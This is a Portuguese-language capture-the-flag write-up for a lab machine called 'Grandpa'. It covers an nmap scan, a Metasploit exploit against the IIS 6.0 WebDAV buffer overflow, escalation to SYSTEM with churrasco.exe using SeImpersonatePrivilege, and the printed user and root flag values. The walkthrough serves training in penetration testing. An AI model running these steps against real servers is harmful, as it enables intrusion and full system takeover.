# Writeup grandpa

## Scan

```
# Nmap 7.92 scan initiated Sun Jan 23 17:59:02 2022 as: nmap -sV --open -Pn -v -T5 -p- -oN fullnamp.txt 10.129.95.233
Nmap scan report for 10.129.95.233
Host is up (0.15s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 23 18:02:50 2022 -- 1 IP address (1 host up) scanned in 228.46 seconds
```

## Enumeration

Após vermos a versão do IIS, conseguimos descobrir que ele possui uma vulnerabilidade de buffer overflow e que possui exploit no msfconsole.

## Exploitation

Ao explorar a vulnerabilidade com o seguinte exploit, será possível ter acesso ao shell:

```
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhost 10.129.95.233
rhost => 10.129.95.233
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost tun1
lhost => tun1
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
```

Para pegarmos a user flag precisaremos de root

## Privilege Escalation

Para fazermos o privilege escalation, podemos usar impersonate attack.

```

C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

Já que o host é um server mais antigo, precisaremos usar o churrasco ao invés do printspoofer.

```
c:\temp>churrasco.exe
churrasco.exe
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
C:\WINDOWS\TEMP

c:\temp>churrasco -d "cmd.exe"
churrasco -d "cmd.exe"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x734
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found SYSTEM token 0x72c
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\temp>whoami
whoami
nt authority\system
```

**User flag:**

```
C:\Documents and Settings\Harry\Desktop>type user.txt
type user.txt
bdff5ec67c3cff017f2bedc146a5d869
```

**Root flag:**

```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
9359e905a2c35f861f6a57cecf28bb7b
```


